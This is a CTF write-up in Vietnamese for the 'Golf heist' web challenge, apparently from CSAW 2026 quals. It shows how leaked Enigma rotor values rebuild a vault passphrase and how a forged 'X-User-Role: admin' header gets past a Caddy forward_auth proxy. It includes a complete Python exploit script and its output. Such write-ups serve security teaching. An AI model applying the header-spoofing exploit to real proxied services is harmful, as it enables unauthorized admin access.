---
title: Golf heist
date: 2026-09-27
ctf: CSAW' 26 QUALS
category: web
difficulty: hard
---

## Đề bài
Avispa Country Club is where old money like Woozie and Ryder think their vault is untouchable. But the caddy carries everything for them - keys, secrets, headers... and he doesn't check what's in the bag.

Word is, there's a Golden Putter in that vault. One of one. All you have to do is find the right numbers, speak the right words, and let the caddy do the rest - the caddy always does.
https://golf-heist.ctf.csaw.io/
File: [golf-heist.zip](https://github.com/Drakie14/Challenges/blob/CSAW'-26-QUALS/golf-heist.zip)
## Solution
App **FastAPI (Python 3.12)**, chủ đề cướp cây gậy golf vàng trong két. Đọc `main.py`, endpoint mục tiêu `POST /api/vault/admin-item` chỉ trả flag khi thỏa **cả 2 điều kiện**:

```python!
@app.post("/api/vault/admin-item")
async def vault_admin(body: VaultPhraseRequest, req: Request):
    phrase = body.phrase.strip().lower().split()
    if phrase != PHRASE:                       # (1) đúng mật khẩu vault
        return JSONResponse({"error": "Wrong phrase."}, status_code=403)
    role = req.headers.get("X-User-Role", "")
    if role.lower() == "admin":                # (2) header role = admin
        return { ..., "flag": FLAG, ... }
    return JSONResponse({"error": "Insufficient role."}, status_code=403)
```

Vậy có 2 lớp cần phá: **(1) biết `PHRASE`** (3 từ, sinh ngẫu nhiên mỗi lần khởi động) và **(2) có quyền admin** qua header `X-User-Role: admin`.

### Lớp 1 — Khôi phục mật khẩu vault (Enigma)

`PHRASE` trông ngẫu nhiên nhưng **tất định** từ 3 rotor `R1,R2,R3`:

```python!
R1 = _sec.randbelow(26); R2 = _sec.randbelow(26); R3 = _sec.randbelow(26)
_letters = enigma(R1, R2, R3)    # -> 3 chữ cái, vd ['L','U','R']
PHRASE = [WORDS[_letters[0]][0], WORDS[_letters[1]][1], WORDS[_letters[2]][0]]
```

Điểm chí mạng: **cả 3 rotor bị rò rỉ qua HTTP header**. Ba endpoint "pro-shop" trả HTTP 418 kèm `X-Golf-Hint` = base64 của giá trị rotor (6 chữ số):

```python!
def hint(v): return base64.b64encode(f"{v:06d}".encode()).decode()

@app.get("/pro-shop/inventory/clubs")   # trả R1, "Rotor I"
async def clubs(req):
    return Response("I'm a teapot.", status_code=418,
        headers={"X-Golf-Hint": hint(R1), "X-Caddy-Note": "Rotor I"})
# /balls -> R2 (Rotor II), /bags -> R3 (Rotor III)
```

Giải base64 → được `R1,R2,R3`, chạy lại đúng hàm `enigma()` của đề → 3 chữ cái → tra bảng `WORDS` (index `[0],[1],[0]` — cũng lộ qua `GET /api/word-table`) → ghép thành mật khẩu. Server tự tay đưa hết mọi mảnh ghép; không cần phá mã Enigma gì cả.

### Lớp 2 — Header Injection (Caddy CVE GHSA-7r4p-vjf4-gxv4)

Có mật khẩu, `/api/vault/enter` cho vào tầng "privileged" và gợi ý CVE của caddy. Xem `GET /api/engineer/caddyfile`:

```!
:8000 {
    forward_auth 127.0.0.1:9091 {
        uri /auth
        copy_headers X-User-Id X-User-Role
    }
    reverse_proxy 127.0.0.1:9092
}
```

`copy_headers` copy `X-User-*` từ phản hồi auth service xuống backend. **CVE GHSA-7r4p-vjf4-gxv4**: Caddy dính lỗi **không strip header do client gửi lên** trước khi forward. `/auth` không set `X-User-Role`, nên header `X-User-Role: admin` client tự nhét vào được giữ nguyên và backend tin tưởng — đúng như gợi ý *"The caddy doesn't strip what the auth service doesn't set."*

> Bản source chạy thẳng uvicorn (không có Caddy trước), nên header gửi trực tiếp tới FastAPI luôn được nhận. Trên server thật có Caddy nhưng dính CVE nên header vẫn xuyên qua → cùng một exploit chạy được ở cả hai nơi.

### Chuỗi khai thác

`clubs/balls/bags` → giải base64 → `R1,R2,R3` → `enigma` → `WORDS` → `PHRASE` → `POST /api/vault/admin-item` với body `{"phrase": "<PHRASE>"}` **và header `X-User-Role: admin`** → nhận flag.

```python!
#!/usr/bin/env python3
# Golf Heist - CSAW' 26 QUALS. Chi dung urllib (thu vien chuan).
# Usage: python3 exploit.py http://TARGET:PORT
import sys, json, base64, urllib.request, urllib.error

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")

# Bang tra cuu sao chep NGUYEN VAN tu app/main.py
ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
W = {"I":"EKMFLGDQVZNTOWYHXUSPAIBRCJ","II":"AJDKSIRUXBLHWTMCQGZNPYFVOE",
     "III":"BDFHJLCPRTXVZNYEIWGAKMUSQO","REF":"YRUHQSLDPXNGOKMIEBFZCWVJAT"}
WORDS = {
    "A":["albatross","approach","ace"],   "B":["birdie","bogey","bunker"],
    "C":["caddy","chip","course"],        "D":["divot","dogleg","driver"],
    "E":["eagle","embed","escrow"],       "F":["fairway","flop","flag"],
    "G":["green","grip","gimme"],         "H":["handicap","hazard","hole"],
    "I":["iron","inside","index"],        "J":["jigger","juniper","joint"],
    "K":["knock","knoll","keeper"],       "L":["links","lie","loft"],
    "M":["mashie","mulligan","marker"],   "N":["niblick","net","nap"],
    "O":["open","out","oath"],            "P":["par","putt","pin"],
    "Q":["qualify","quest","quad"],       "R":["rough","round","ridge"],
    "S":["stroke","scratch","slope"],     "T":["tee","tap","triple"],
    "U":["under","uphill","uneven"],      "V":["vault","vantage","vector"],
    "W":["wedge","water","waggle"],       "X":["xeric","xerox","xenon"],
    "Y":["yardage","yips","yield"],       "Z":["zone","zenith","zero"],
}

def enigma(r1, r2, r3):
    def f(c, w, o): return w[(ALPHA.index(c)+o)%26]
    out = []
    for s in ["G","O","L"]:
        c=s; c=f(c,W["I"],r1%26); c=f(c,W["II"],r2%26); c=f(c,W["III"],r3%26)
        c=W["REF"][ALPHA.index(c)]; c=f(c,W["III"],(26-r3%26)%26)
        out.append(c)
    return out

def get_hint(path):
    req = urllib.request.Request(BASE + path, method="GET")
    try:
        with urllib.request.urlopen(req) as r: hdr = r.headers.get("X-Golf-Hint")
    except urllib.error.HTTPError as e:          # 418 nem HTTPError, header van con
        hdr = e.headers.get("X-Golf-Hint")
    return int(base64.b64decode(hdr).decode())   # '000007' -> 7

def post_json(path, body, headers=None):
    data = json.dumps(body).encode()
    h = {"Content-Type": "application/json"}
    if headers: h.update(headers)
    req = urllib.request.Request(BASE + path, data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req) as r: return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e: return e.code, json.loads(e.read())

# 1) Ro ri rotor Enigma qua header
R1 = get_hint("/pro-shop/inventory/clubs")
R2 = get_hint("/pro-shop/inventory/balls")
R3 = get_hint("/pro-shop/inventory/bags")
print(f"[*] Leaked rotors: R1={R1} R2={R2} R3={R3}")

# 2) Enigma -> 3 chu cai -> mat khau (index [0],[1],[0] nhu main.py)
letters = enigma(R1, R2, R3)
phrase = " ".join([WORDS[letters[0]][0], WORDS[letters[1]][1], WORDS[letters[2]][0]])
print(f"[+] Vault phrase: '{phrase}'")

# 3) Header injection: X-User-Role: admin (Caddy CVE GHSA-7r4p-vjf4-gxv4)
st, body = post_json("/api/vault/admin-item", {"phrase": phrase},
                     {"X-User-Role": "admin", "X-User-Id": "heister"})
print(f"[*] /api/vault/admin-item -> HTTP {st}")
print(f"\n[+] FLAG: {body['flag']}\n" if st == 200 and "flag" in body
      else json.dumps(body, indent=2))
```

Kết quả chạy thực tế (local, flag giả để verify):

```!
[*] Leaked rotors: R1=6 R2=3 R3=4
[+] Vault phrase: 'links uphill rough'
[*] /api/vault/admin-item -> HTTP 200

[+] FLAG: csaw{fake_local_flag_verify_123}
```

->Flag: `csaw{...}` (flag thật lấy từ biến môi trường `FLAG` của instance online — chạy `exploit.py` với URL server thi đấu)
